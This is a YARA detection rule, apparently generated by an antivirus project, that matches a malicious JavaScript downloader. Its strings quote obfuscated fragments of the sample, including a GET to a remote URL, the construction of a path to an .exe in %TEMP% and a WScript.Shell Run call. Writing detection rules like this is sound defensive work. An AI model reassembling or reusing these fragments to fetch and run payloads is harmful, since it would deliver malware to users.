rule sig_20160328_03b4c39b8ee07b73a1163b44d2c3c103 {
  meta:
    description = "datamaliciousorder - file 20160328_03b4c39b8ee07b73a1163b44d2c3c103.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9d92c8c04d3c5f6b10cb10f1302a492e7f7ac2996be5be0b76cae180be76800e"

  strings:
    $s1  = "function Plzwyvjipx() {return Hjbwslnrek[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"iFxgOeom0Qxj1.exe\";};" fullword ascii
    $s2  = "do {WScript[Bhfbnjjz](Khchz() * 11)} while (Ijkvj[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Dxcvvoyy(Tcyrazbh, Opkbd){return Tcyrazbh - Opkbd;};" fullword ascii
    $s4  = "Ijkvj[Yxtijqp](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s5  = "var Hjbwslnrek = function Pzsgbsn() {return WScript[Algyutf](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ptwzaqiear() {return ((Zsagnbmcvg == true) && (Zsagnbmcvg == Awgozi)) ? 1 : Uoxrlkckyv;};" fullword ascii
    $s7  = "function Xhtjdfown(Kgzdl){Hjbwslnrek[\"Run\"](Kgzdl, Uoxrlkckyv, Uoxrlkckyv);};" fullword ascii
    $s8  = "Awgozi = true; " fullword ascii
    $s9  = " while (Tsweqz){" fullword ascii
    $s10 = "var Zsagnbmcvg = false;" fullword ascii
    $s11 = "var Idooexforc = false;" fullword ascii
    $s12 = "Zsagnbmcvg = true; " fullword ascii
    $s13 = "var Ybqzsdqlro = new this[\"Date\"]();" fullword ascii
    $s14 = "function Khchz(){return 22;};" fullword ascii
    $s15 = "var Awgozi = false;" fullword ascii
    $s16 = "function Kstqcmnnyb(){return Chiqfij;};" fullword ascii
    $s17 = "function Kmazx(Semup) {var Jwklgu = (1, 2, 3, 4, 5, Semup); return Jwklgu;};" fullword ascii
    $s18 = "function Vgyrrqqhzt()" fullword ascii
    $s19 = "function Pybmy(){return Algyutf;};" fullword ascii
    $s20 = "return Dxcvvoyy(Duubwinuyv, Cvycawv);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}